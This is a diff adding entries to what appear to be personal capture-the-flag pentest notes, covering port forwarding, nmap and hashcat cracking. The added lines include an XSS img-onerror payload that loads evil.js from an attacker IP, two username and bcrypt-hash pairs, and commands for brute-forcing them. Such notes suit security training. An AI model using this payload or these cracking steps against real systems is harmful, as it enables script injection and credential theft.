@@ -4,6 +4,10 @@ cat a.txt, less a.txt      #cat and less to read files
 Identify FQDN of the Domain Controller
 #nmap --script=smb-os-discovery.nse 10.10.1.22
 
+Upload reverse shell script file in web-server But must upload with PHP server
+------------------------------------------------------------------------------
+<img SRC=c onerror="var script1 = document.createElement('script');script1.src = 'http://10.10.16.25:8090/evil.js';document.head.appendChild(script1);"/>
+
 capture with tcpdump
 #tcpdump -i tun0 icmp
 
@@ -258,11 +262,16 @@ ftp> get clean.sh -
 Exporting the path
 export PATH=/tmp:$path
 
-Portward with ssh tunneling is always in attacker side not in victim side
+Portward with ssh tunneling is always (in attacker side) not in victim side
 --------------------------------------------------------------------------
 #ssh -L 7878(you can use a different port):182.17.0.2:8080 aubreanna@internal.thm
 #ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.10.158.205 (port forward with id_rsa)
 To gain access to Jenkins, type localhost:[Port Number] in your browser:
+
+When doing ssh_tunneling,do port-forwarding the same port that the victim host, because when upgrading to webserver, 
+(if you don't port forward the sameport, webserver is not fully updated).
+
+#ssh -L 3000:127.0.0.1:3000 frok_donky@10.10.11.6
 
 You can also portforward with meterpreter shell by using multi/handler
 meterpreter > run autoroute -s 127.0.0.1/24   
@@ -335,6 +344,16 @@ Hashcat command
 hashcat -m 1710 -a 0 salt /usr/share/wordlists/rockyou.txt
 1710 - https://hashcat.net/wiki/doku.php?id=example_hashes, search here and choose the number suitable for your hash
 salt - ur hash file
+
+For hashcat,When the database gives username and hash, combine them and burteforce
+----------------------------------------------------------------------------------
+frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
+admin:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC
+
+In order to find hashtype or crack when contating user in hash (use --user)
+----------------------------------------------------------------------------
+hashcat hash /usr/share/wordlists/rockyou.txt --user
+hashcat hash -a 3 -m 3200 /usr/share/wordlists/rockyou.txt --user
 
 
 
